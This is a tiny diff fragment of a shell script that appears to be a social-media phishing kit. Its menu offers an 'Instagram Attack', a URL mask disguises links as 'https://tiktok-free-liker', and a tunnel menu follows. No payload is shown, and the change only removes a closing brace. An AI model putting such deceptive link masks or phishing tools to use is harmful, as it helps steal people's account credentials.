@@ -79,4 +79,4 @@ ${RED}[${WHITE}04${RED}]${ORANGE} Instagram Attack${RED}[${WHITE}14${RED}]${ORAN
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
    exit
-}
+
